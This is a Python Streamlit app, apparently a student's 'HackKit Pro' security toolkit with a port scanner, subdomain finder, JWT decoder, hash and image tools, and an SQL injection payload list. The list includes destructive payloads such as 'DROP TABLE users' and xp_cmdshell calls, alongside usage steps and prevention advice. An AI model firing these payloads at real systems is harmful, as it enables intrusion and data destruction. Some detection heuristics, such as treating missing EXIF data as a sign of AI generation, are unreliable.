import streamlit as st
import hashlib
import socket
import base64
import json
import re
import urllib.parse
from datetime import datetime

# ============================================================
# FLASHY CUSTOM CSS
# ============================================================
st.set_page_config(page_title="HackKit Pro", page_icon="💀", layout="wide")

st.markdown("""
<style>
    /* Main background */
    .stApp { background-color: #0a0a0a; }
    
    /* Sidebar */
    [data-testid="stSidebar"] {
        background: linear-gradient(180deg, #0d0d0d 0%, #1a0a2e 100%);
        border-right: 1px solid #00ff41;
    }
    
    /* Title glow effect */
    .main-title {
        font-size: 2.5em;
        font-weight: 900;
        text-align: center;
        color: #00ff41;
        text-shadow: 0 0 20px #00ff41, 0 0 40px #00ff41;
        font-family: 'Courier New', monospace;
        padding: 20px;
        border: 1px solid #00ff41;
        border-radius: 10px;
        margin-bottom: 20px;
        background: rgba(0,255,65,0.05);
    }
    
    .subtitle {
        text-align: center;
        color: #888;
        font-family: 'Courier New', monospace;
        margin-top: -15px;
        margin-bottom: 20px;
    }

    /* Tool headers */
    .tool-header {
        font-size: 1.8em;
        font-weight: bold;
        color: #00ff41;
        font-family: 'Courier New', monospace;
        border-bottom: 1px solid #00ff41;
        padding-bottom: 10px;
        margin-bottom: 20px;
    }

    /* Result boxes */
    .result-box {
        background: #0d1117;
        border: 1px solid #00ff41;
        border-radius: 8px;
        padding: 15px;
        font-family: 'Courier New', monospace;
        color: #00ff41;
        margin: 10px 0;
    }

    .danger-box {
        background: #1a0000;
        border: 1px solid #ff4444;
        border-radius: 8px;
        padding: 15px;
        font-family: 'Courier New', monospace;
        color: #ff4444;
        margin: 10px 0;
    }

    .warning-box {
        background: #1a1400;
        border: 1px solid #ffaa00;
        border-radius: 8px;
        padding: 15px;
        font-family: 'Courier New', monospace;
        color: #ffaa00;
        margin: 10px 0;
    }

    /* Sidebar radio buttons */
    .stRadio label {
        color: #00ff41 !important;
        font-family: 'Courier New', monospace !important;
    }

    /* Input fields */
    .stTextInput input, .stTextArea textarea {
        background: #0d1117 !important;
        color: #00ff41 !important;
        border: 1px solid #00ff41 !important;
        font-family: 'Courier New', monospace !important;
    }

    /* Buttons */
    .stButton button {
        background: transparent !important;
        color: #00ff41 !important;
        border: 1px solid #00ff41 !important;
        font-family: 'Courier New', monospace !important;
        font-weight: bold !important;
        transition: all 0.3s !important;
    }
    .stButton button:hover {
        background: #00ff41 !important;
        color: #000 !important;
        box-shadow: 0 0 20px #00ff41 !important;
    }

    /* File uploader */
    [data-testid="stFileUploader"] {
        border: 1px dashed #00ff41 !important;
        border-radius: 8px !important;
        background: rgba(0,255,65,0.02) !important;
    }

    /* Metrics */
    [data-testid="stMetric"] {
        background: #0d1117;
        border: 1px solid #00ff41;
        border-radius: 8px;
        padding: 10px;
    }

    /* Code blocks */
    .stCode {
        background: #0d1117 !important;
        border: 1px solid #333 !important;
    }

    /* Scrollbar */
    ::-webkit-scrollbar { width: 6px; }
    ::-webkit-scrollbar-track { background: #0a0a0a; }
    ::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 3px; }

    /* Warning/success/error overrides */
    .stSuccess { background: rgba(0,255,65,0.1) !important; border: 1px solid #00ff41 !important; }
    .stError { background: rgba(255,68,68,0.1) !important; border: 1px solid #ff4444 !important; }
    .stWarning { background: rgba(255,170,0,0.1) !important; border: 1px solid #ffaa00 !important; }
    .stInfo { background: rgba(0,170,255,0.1) !important; border: 1px solid #00aaff !important; }
</style>
""", unsafe_allow_html=True)

# ============================================================
# HEADER
# ============================================================
st.markdown('<div class="main-title">💀 HackKit Pro</div>', unsafe_allow_html=True)
st.markdown('<div class="subtitle">[ Professional Ethical Hacking & AI Detection Toolkit ]</div>', unsafe_allow_html=True)

# ============================================================
# SIDEBAR
# ============================================================
st.sidebar.markdown("## 💀 HackKit Pro")
st.sidebar.markdown("---")
tool = st.sidebar.radio("", [
    "🔍 Port Scanner",
    "🌐 HTTP Header Analyzer",
    "📡 IP Geolocation",
    "🔑 Password Analyzer",
    "💉 SQL Injection Payloads",
    "🎯 Subdomain Finder",
    "🔓 JWT Decoder",
    "🕵️ Steganography Detector",
    "🔐 File Hash Checker",
    "📋 Image Metadata Extractor",
    "🤖 AI Image Detector"
])
st.sidebar.markdown("---")
st.sidebar.markdown("```\nBuilt by: Cybersecurity Student\nVersion:  2.0 Pro\nStatus:   ACTIVE\n```")

# ============================================================
# TOOL 1: PORT SCANNER
# ============================================================
if tool == "🔍 Port Scanner":
    st.markdown('<div class="tool-header">🔍 Port Scanner</div>', unsafe_allow_html=True)
    st.info("⚠️ Only scan systems you own or have permission to scan. Unauthorized scanning is illegal.")

    target = st.text_input("Target IP or Domain:", placeholder="e.g. 192.168.1.1 or example.com")
    
    col1, col2 = st.columns(2)
    with col1:
        start_port = st.number_input("Start Port", min_value=1, max_value=65535, value=1)
    with col2:
        end_port = st.number_input("End Port", min_value=1, max_value=65535, value=1024)

    common_ports = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
        53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 3306: "MySQL",
        3389: "RDP", 5432: "PostgreSQL", 8080: "HTTP-Alt", 8443: "HTTPS-Alt"
    }

    if st.button("🚀 Start Scan") and target:
        open_ports = []
        progress = st.progress(0)
        status = st.empty()
        total = end_port - start_port + 1

        try:
            ip = socket.gethostbyname(target)
            st.markdown(f'<div class="result-box">Target resolved: {target} → {ip}</div>', unsafe_allow_html=True)
        except:
            st.error("Could not resolve hostname. Check the target.")
            st.stop()

        for i, port in enumerate(range(int(start_port), int(end_port)+1)):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    service = common_ports.get(port, "Unknown")
                    open_ports.append((port, service))
                sock.close()
            except:
                pass
            progress.progress((i+1) / total)
            status.text(f"Scanning port {port}...")

        status.empty()
        progress.empty()

        if open_ports:
            st.markdown(f'<div class="result-box">✅ Scan complete! Found {len(open_ports)} open ports:</div>', unsafe_allow_html=True)
            for port, service in open_ports:
                risk = "🔴 HIGH RISK" if port in [21,23,445,3389] else "🟡 MEDIUM" if port in [80,8080] else "🟢 NORMAL"
                st.markdown(f'<div class="result-box">PORT {port}/tcp  OPEN  {service}  {risk}</div>', unsafe_allow_html=True)
        else:
            st.warning("No open ports found in the specified range.")

# ============================================================
# TOOL 2: HTTP HEADER ANALYZER
# ============================================================
elif tool == "🌐 HTTP Header Analyzer":
    st.markdown('<div class="tool-header">🌐 HTTP Header Analyzer</div>', unsafe_allow_html=True)
    st.write("Analyze website security headers and find vulnerabilities.")

    url = st.text_input("Enter Website URL:", placeholder="https://example.com")

    if st.button("🔍 Analyze Headers") and url:
        try:
            import urllib.request
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            response = urllib.request.urlopen(req, timeout=10)
            headers = dict(response.headers)

            st.markdown("### 📋 Raw Headers")
            header_text = "\n".join([f"{k}: {v}" for k, v in headers.items()])
            st.code(header_text)

            st.markdown("### 🔐 Security Analysis")

            security_headers = {
                "Strict-Transport-Security": ("HSTS — Forces HTTPS", "🔴 MISSING — Site vulnerable to protocol downgrade attacks"),
                "X-Frame-Options": ("Clickjacking Protection", "🔴 MISSING — Site vulnerable to clickjacking"),
                "X-Content-Type-Options": ("MIME Sniffing Protection", "🟡 MISSING — Browser may misinterpret files"),
                "Content-Security-Policy": ("XSS Protection Policy", "🔴 MISSING — No CSP, XSS attacks possible"),
                "X-XSS-Protection": ("XSS Filter", "🟡 MISSING — No XSS filter header"),
                "Referrer-Policy": ("Referrer Info Control", "🟢 Optional but recommended"),
                "Permissions-Policy": ("Feature Permissions", "🟢 Optional but recommended"),
            }

            score = 0
            total_checks = len(security_headers)

            for header, (name, warning) in security_headers.items():
                found = any(k.lower() == header.lower() for k in headers.keys())
                if found:
                    val = headers.get(header, "")
                    st.markdown(f'<div class="result-box">✅ {name} — PRESENT</div>', unsafe_allow_html=True)
                    score += 1
                else:
                    if "🔴" in warning:
                        st.markdown(f'<div class="danger-box">{warning}</div>', unsafe_allow_html=True)
                    else:
                        st.markdown(f'<div class="warning-box">{warning}</div>', unsafe_allow_html=True)

            security_score = round((score / total_checks) * 100)
            st.markdown(f"### 🎯 Security Score: {security_score}/100")
            st.progress(security_score / 100)

            if security_score < 40:
                st.error("❌ Poor security headers — this site has multiple vulnerabilities!")
            elif security_score < 70:
                st.warning("⚠️ Moderate security — some headers missing")
            else:
                st.success("✅ Good security headers!")

        except Exception as e:
            st.error(f"Error: {str(e)} — Make sure URL starts with https://")

# ============================================================
# TOOL 3: IP GEOLOCATION
# ============================================================
elif tool == "📡 IP Geolocation":
    st.markdown('<div class="tool-header">📡 IP Geolocation & Network Info</div>', unsafe_allow_html=True)
    st.write("Look up location and network info for any IP address or domain.")

    target = st.text_input("Enter IP Address or Domain:", placeholder="e.g. 8.8.8.8 or google.com")

    if st.button("🔍 Lookup") and target:
        try:
            ip = socket.gethostbyname(target)
            st.markdown(f'<div class="result-box">Resolved: {target} → {ip}</div>', unsafe_allow_html=True)

            import urllib.request
            response = urllib.request.urlopen(f"http://ip-api.com/json/{ip}", timeout=10)
            data = json.loads(response.read().decode())

            if data.get("status") == "success":
                col1, col2, col3 = st.columns(3)
                with col1:
                    st.metric("🌍 Country", data.get("country", "N/A"))
                    st.metric("🏙️ City", data.get("city", "N/A"))
                with col2:
                    st.metric("🏢 ISP", data.get("isp", "N/A"))
                    st.metric("📮 ZIP", data.get("zip", "N/A"))
                with col3:
                    st.metric("🕐 Timezone", data.get("timezone", "N/A"))
                    st.metric("📡 AS", data.get("as", "N/A"))

                st.markdown("### 📍 Full Details")
                st.markdown(f'''<div class="result-box">
IP Address  : {data.get("query")}<br>
Country     : {data.get("country")} ({data.get("countryCode")})<br>
Region      : {data.get("regionName")}<br>
City        : {data.get("city")}<br>
Coordinates : {data.get("lat")}, {data.get("lon")}<br>
ISP         : {data.get("isp")}<br>
Organization: {data.get("org")}<br>
Timezone    : {data.get("timezone")}
</div>''', unsafe_allow_html=True)

                # DNS info
                st.markdown("### 🔍 DNS Info")
                try:
                    hostname = socket.gethostbyaddr(ip)
                    st.markdown(f'<div class="result-box">Reverse DNS: {hostname[0]}</div>', unsafe_allow_html=True)
                except:
                    st.markdown('<div class="warning-box">No reverse DNS found</div>', unsafe_allow_html=True)
            else:
                st.error("Could not get geolocation data for this IP.")

        except Exception as e:
            st.error(f"Error: {str(e)}")

# ============================================================
# TOOL 4: PASSWORD ANALYZER
# ============================================================
elif tool == "🔑 Password Analyzer":
    st.markdown('<div class="tool-header">🔑 Password Strength Analyzer & Hash Identifier</div>', unsafe_allow_html=True)

    tab1, tab2 = st.tabs(["💪 Password Strength", "🔍 Hash Identifier"])

    with tab1:
        password = st.text_input("Enter Password to Analyze:", type="password", placeholder="Enter any password...")
        
        if password:
            score = 0
            feedback = []
            
            if len(password) >= 8: score += 1
            else: feedback.append("❌ Too short — use at least 8 characters")
            
            if len(password) >= 12: score += 1
            else: feedback.append("⚠️ Use 12+ characters for better security")
            
            if re.search(r'[A-Z]', password): score += 1
            else: feedback.append("❌ Add uppercase letters (A-Z)")
            
            if re.search(r'[a-z]', password): score += 1
            else: feedback.append("❌ Add lowercase letters (a-z)")
            
            if re.search(r'\d', password): score += 1
            else: feedback.append("❌ Add numbers (0-9)")
            
            if re.search(r'[!@#$%^&*(),.?":{}|<>]', password): score += 1
            else: feedback.append("❌ Add special characters (!@#$%...)")
            
            common = ["password", "123456", "qwerty", "admin", "letmein", "welcome"]
            if any(c in password.lower() for c in common):
                score -= 2
                feedback.append("🔴 Contains common password pattern!")

            strength_labels = ["☠️ EXTREMELY WEAK", "🔴 VERY WEAK", "🔴 WEAK", "🟡 MODERATE", "🟡 GOOD", "🟢 STRONG", "💚 VERY STRONG"]
            strength = strength_labels[max(0, min(score, 6))]

            st.markdown(f'<div class="result-box">Strength: {strength} ({score}/6)</div>', unsafe_allow_html=True)
            st.progress(max(0, score) / 6)

            for f in feedback:
                if "❌" in f or "🔴" in f:
                    st.markdown(f'<div class="danger-box">{f}</div>', unsafe_allow_html=True)
                else:
                    st.markdown(f'<div class="warning-box">{f}</div>', unsafe_allow_html=True)

            st.markdown("### 🔐 Password Hashes")
            b = password.encode()
            st.code(f"MD5:    {hashlib.md5(b).hexdigest()}")
            st.code(f"SHA1:   {hashlib.sha1(b).hexdigest()}")
            st.code(f"SHA256: {hashlib.sha256(b).hexdigest()}")

    with tab2:
        hash_input = st.text_input("Paste a Hash to Identify:", placeholder="Paste any hash here...")
        if hash_input:
            length = len(hash_input.strip())
            hash_types = {
                32: "MD5",
                40: "SHA1",
                56: "SHA224",
                64: "SHA256",
                96: "SHA384",
                128: "SHA512",
                60: "bcrypt",
                13: "DES (Unix)",
            }
            identified = hash_types.get(length, "Unknown hash type")
            st.markdown(f'<div class="result-box">Hash Length: {length} chars\nIdentified As: {identified}</div>', unsafe_allow_html=True)
            
            if identified != "Unknown hash type":
                st.info(f"💡 To crack this hash, try: https://crackstation.net/ or https://hashes.com/en/decrypt/hash")

# ============================================================
# TOOL 5: SQL INJECTION PAYLOADS
# ============================================================
elif tool == "💉 SQL Injection Payloads":
    st.markdown('<div class="tool-header">💉 SQL Injection Payload Generator</div>', unsafe_allow_html=True)
    st.info("⚠️ For educational purposes and authorized penetration testing only.")

    category = st.selectbox("Select Payload Category:", [
        "Authentication Bypass",
        "Union Based",
        "Error Based",
        "Blind Boolean Based",
        "Time Based Blind",
        "Comment Based",
        "Stacked Queries"
    ])

    payloads = {
        "Authentication Bypass": [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin'/*",
            "' OR 1=1--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "' OR 'x'='x",
            "1' OR '1' = '1']%00",
        ],
        "Union Based": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT username,password FROM users--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
        ],
        "Error Based": [
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
            "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' OR 1=1 AND SLEEP(5)--",
            "1 AND (SELECT * FROM users WHERE ROWNUM=1)",
        ],
        "Blind Boolean Based": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND substring(username,1,1)='a",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "1' AND '1'='1",
            "1' AND '1'='2",
        ],
        "Time Based Blind": [
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--",
            "' AND SLEEP(5) AND '1'='1",
            "1; SELECT SLEEP(5)",
            "'; SELECT pg_sleep(5)--",
            "' OR SLEEP(5)#",
        ],
        "Comment Based": [
            "/*comment*/",
            "/*!SELECT*/",
            "--",
            "#",
            "/*",
            "//",
            ";",
        ],
        "Stacked Queries": [
            "'; INSERT INTO users VALUES('hacker','hacked')--",
            "'; DROP TABLE users--",
            "'; UPDATE users SET password='hacked' WHERE '1'='1",
            "1; EXEC xp_cmdshell('whoami')",
        ]
    }

    st.markdown(f"### 🎯 {category} Payloads")
    for i, payload in enumerate(payloads[category], 1):
        st.code(payload)

    st.markdown("### 📖 How to Use These")
    st.markdown("""
<div class="result-box">
1. Find an input field (login, search, URL parameter)<br>
2. Try each payload in the input field<br>
3. Watch for: error messages, different responses, delays<br>
4. Use Burp Suite to intercept and modify requests<br>
5. Document all findings for your report
</div>
""", unsafe_allow_html=True)

    st.markdown("### 🛡️ How to Prevent SQL Injection")
    st.markdown("""
<div class="result-box">
✅ Use parameterized queries / prepared statements<br>
✅ Input validation and sanitization<br>
✅ Use ORM frameworks<br>
✅ Principle of least privilege for DB users<br>
✅ WAF (Web Application Firewall)
</div>
""", unsafe_allow_html=True)

# ============================================================
# TOOL 6: SUBDOMAIN FINDER
# ============================================================
elif tool == "🎯 Subdomain Finder":
    st.markdown('<div class="tool-header">🎯 Subdomain Finder (Bug Bounty Tool)</div>', unsafe_allow_html=True)
    st.info("⚠️ Only use on domains you own or have permission to test.")

    domain = st.text_input("Enter Target Domain:", placeholder="e.g. example.com")

    common_subdomains = [
        "www", "mail", "ftp", "admin", "api", "dev", "test", "staging",
        "app", "blog", "shop", "store", "cdn", "static", "media", "img",
        "login", "portal", "dashboard", "vpn", "remote", "gateway",
        "beta", "demo", "old", "backup", "secure", "payments", "auth",
        "docs", "support", "help", "forum", "community", "status",
        "monitor", "analytics", "tracking", "mobile", "m", "wap",
        "smtp", "pop", "imap", "ns1", "ns2", "mx", "db", "database",
        "internal", "intranet", "corp", "office", "webmail", "cpanel"
    ]

    if st.button("🚀 Find Subdomains") and domain:
        found = []
        progress = st.progress(0)
        status = st.empty()
        total = len(common_subdomains)

        for i, sub in enumerate(common_subdomains):
            full = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(full)
                found.append((full, ip))
            except:
                pass
            progress.progress((i+1) / total)
            status.text(f"Checking: {full}")

        status.empty()
        progress.empty()

        if found:
            st.markdown(f'<div class="result-box">✅ Found {len(found)} subdomains!</div>', unsafe_allow_html=True)
            for subdomain, ip in found:
                risk = "🔴 Interesting!" if any(x in subdomain for x in ["admin","dev","staging","test","backup","internal"]) else "🟢"
                st.markdown(f'<div class="result-box">{risk} {subdomain} → {ip}</div>', unsafe_allow_html=True)
            st.info("💡 Bug Bounty Tip: dev/staging/admin subdomains often have weaker security — great targets for testing!")
        else:
            st.warning("No common subdomains found. Try a different domain or a larger wordlist.")

# ============================================================
# TOOL 7: JWT DECODER
# ============================================================
elif tool == "🔓 JWT Decoder":
    st.markdown('<div class="tool-header">🔓 JWT Token Decoder & Analyzer</div>', unsafe_allow_html=True)
    st.write("Decode and analyze JWT tokens — popular in web app bug hunting!")

    jwt_token = st.text_area("Paste JWT Token here:", placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...")

    if st.button("🔍 Decode Token") and jwt_token:
        try:
            parts = jwt_token.strip().split(".")
            if len(parts) != 3:
                st.error("Invalid JWT format — should have 3 parts separated by dots")
            else:
                def decode_part(part):
                    padding = 4 - len(part) % 4
                    if padding != 4:
                        part += "=" * padding
                    return json.loads(base64.b64decode(part).decode("utf-8"))

                header = decode_part(parts[0])
                payload = decode_part(parts[1])
                signature = parts[2]

                col1, col2 = st.columns(2)

                with col1:
                    st.markdown("### 📋 Header")
                    st.markdown(f'<div class="result-box">{json.dumps(header, indent=2)}</div>', unsafe_allow_html=True)

                with col2:
                    st.markdown("### 📦 Payload")
                    st.markdown(f'<div class="result-box">{json.dumps(payload, indent=2)}</div>', unsafe_allow_html=True)

                st.markdown("### 🔐 Signature")
                st.code(signature)

                # Security Analysis
                st.markdown("### 🔍 Security Analysis")
                
                alg = header.get("alg", "")
                if alg == "none":
                    st.markdown('<div class="danger-box">🔴 CRITICAL: Algorithm is "none" — token has NO signature! This is a major vulnerability!</div>', unsafe_allow_html=True)
                elif alg in ["HS256", "HS384", "HS512"]:
                    st.markdown(f'<div class="warning-box">🟡 Using {alg} (symmetric) — if key is weak, token can be brute-forced</div>', unsafe_allow_html=True)
                elif alg in ["RS256", "RS384", "RS512"]:
                    st.markdown(f'<div class="result-box">🟢 Using {alg} (asymmetric RSA) — more secure</div>', unsafe_allow_html=True)

                if "exp" in payload:
                    exp_time = datetime.fromtimestamp(payload["exp"])
                    if exp_time < datetime.now():
                        st.markdown(f'<div class="danger-box">🔴 Token EXPIRED at {exp_time}</div>', unsafe_allow_html=True)
                    else:
                        st.markdown(f'<div class="result-box">✅ Token valid until: {exp_time}</div>', unsafe_allow_html=True)
                else:
                    st.markdown('<div class="warning-box">⚠️ No expiration time set — token never expires!</div>', unsafe_allow_html=True)

                if "admin" in str(payload).lower() or "role" in str(payload).lower():
                    st.markdown('<div class="warning-box">🎯 Bug Bounty Alert: Token contains role/admin claims — try privilege escalation!</div>', unsafe_allow_html=True)

        except Exception as e:
            st.error(f"Error decoding token: {str(e)}")

# ============================================================
# TOOL 8: STEGANOGRAPHY DETECTOR
# ============================================================
elif tool == "🕵️ Steganography Detector":
    st.markdown('<div class="tool-header">🕵️ Steganography Detector</div>', unsafe_allow_html=True)
    st.write("Detect hidden data inside images using LSB analysis.")
    uploaded_file = st.file_uploader("Upload Image", type=["png","bmp","jpg","jpeg"])
    if uploaded_file:
        from PIL import Image
        import numpy as np
        image = Image.open(uploaded_file).convert("RGB")
        st.image(image, width=400)
        with st.spinner("Analyzing..."):
            img_array = np.array(image)
            avg = ((img_array[:,:,0] & 1).mean() +
                   (img_array[:,:,1] & 1).mean() +
                   (img_array[:,:,2] & 1).mean()) / 3
            score = abs(avg - 0.5) * 200
        st.write(f"**Suspicion Score:** {round(score,2)} / 100")
        st.progress(min(score/100, 1.0))
        if score < 15:
            st.markdown('<div class="danger-box">⚠️ Possible hidden data detected! LSB pattern is unusually uniform.</div>', unsafe_allow_html=True)
        elif score > 35:
            st.markdown('<div class="result-box">✅ Image appears clean — no obvious steganography detected.</div>', unsafe_allow_html=True)
        else:
            st.markdown('<div class="warning-box">🔍 Inconclusive — manual inspection recommended.</div>', unsafe_allow_html=True)

# ============================================================
# TOOL 9: FILE HASH CHECKER
# ============================================================
elif tool == "🔐 File Hash Checker":
    st.markdown('<div class="tool-header">🔐 File Hash Checker</div>', unsafe_allow_html=True)
    st.write("Generate cryptographic hashes of any file to verify integrity.")
    uploaded_file = st.file_uploader("Upload Any File", type=None)
    if uploaded_file:
        b = uploaded_file.read()
        st.markdown(f'<div class="result-box">File: {uploaded_file.name} | Size: {round(len(b)/1024,2)} KB</div>', unsafe_allow_html=True)
        st.code(f"MD5:    {hashlib.md5(b).hexdigest()}")
        st.code(f"SHA1:   {hashlib.sha1(b).hexdigest()}")
        st.code(f"SHA256: {hashlib.sha256(b).hexdigest()}")
        st.code(f"SHA512: {hashlib.sha512(b).hexdigest()}")
        known = st.text_input("Paste known hash to compare:")
        if known:
            hashes = [hashlib.md5(b).hexdigest(), hashlib.sha1(b).hexdigest(),
                      hashlib.sha256(b).hexdigest(), hashlib.sha512(b).hexdigest()]
            if known.strip().lower() in hashes:
                st.success("✅ Hash MATCHES — File is authentic!")
            else:
                st.error("❌ Hash does NOT match — File may be tampered!")

# ============================================================
# TOOL 10: IMAGE METADATA EXTRACTOR
# ============================================================
elif tool == "📋 Image Metadata Extractor":
    st.markdown('<div class="tool-header">📋 Image Metadata Extractor</div>', unsafe_allow_html=True)
    st.write("Extract hidden EXIF metadata — camera info, GPS location, and more.")
    uploaded_file = st.file_uploader("Upload Image", type=["jpg","jpeg","png","webp","tiff"])
    if uploaded_file:
        from PIL import Image
        image = Image.open(uploaded_file)
        st.image(image, width=400)
        try:
            exif_data = image._getexif()
            if exif_data:
                from PIL.ExifTags import TAGS
                st.markdown("### 📄 EXIF Metadata Found")
                for tag_id, value in exif_data.items():
                    tag = TAGS.get(tag_id, tag_id)
                    try:
                        st.markdown(f'<div class="result-box"><b>{tag}:</b> {value}</div>', unsafe_allow_html=True)
                    except:
                        pass
            else:
                st.markdown('<div class="warning-box">⚠️ No EXIF metadata — AI images usually have none. This is a clue!</div>', unsafe_allow_html=True)
        except:
            st.markdown('<div class="warning-box">No metadata found.</div>', unsafe_allow_html=True)
        st.markdown(f'<div class="result-box">Size: {image.size[0]}x{image.size[1]} | Format: {image.format} | File Size: {round(uploaded_file.size/1024,2)} KB</div>', unsafe_allow_html=True)

# ============================================================
# TOOL 11: AI IMAGE DETECTOR (IMPROVED)
# ============================================================
elif tool == "🤖 AI Image Detector":
    st.markdown('<div class="tool-header">🤖 AI Generated Image Detector</div>', unsafe_allow_html=True)
    st.write("Detect if an image was created by AI (Midjourney, DALL-E, Stable Diffusion, etc.)")
    st.warning("⚠️ First time clicking Analyze downloads the AI model (~500MB). Needs internet.")

    uploaded_file = st.file_uploader("Upload Image", type=["jpg","jpeg","png","webp"])
    if uploaded_file:
        from PIL import Image
        image = Image.open(uploaded_file).convert("RGB")
        st.image(image, width=400)

        col1, col2, col3 = st.columns(3)
        with col1:
            st.metric("Width", f"{image.size[0]}px")
        with col2:
            st.metric("Height", f"{image.size[1]}px")
        with col3:
            st.metric("File Size", f"{round(uploaded_file.size/1024,2)} KB")

        if st.button("🔍 Analyze with AI"):
            with st.spinner("Loading model and analyzing... please wait 2-3 mins first time..."):
                from transformers import pipeline
                detector = pipeline("image-classification", model="umm-maybe/AI-image-detector")
                results = detector(image)

            for r in results:
                score = round(r["score"] * 100, 2)
                if r["label"] == "artificial":
                    st.markdown(f'<div class="danger-box">🤖 AI GENERATED — {score}% confidence</div>', unsafe_allow_html=True)
                    st.progress(score/100)
                else:
                    st.markdown(f'<div class="result-box">✅ REAL / HUMAN — {score}% confidence</div>', unsafe_allow_html=True)
                    st.progress(score/100)
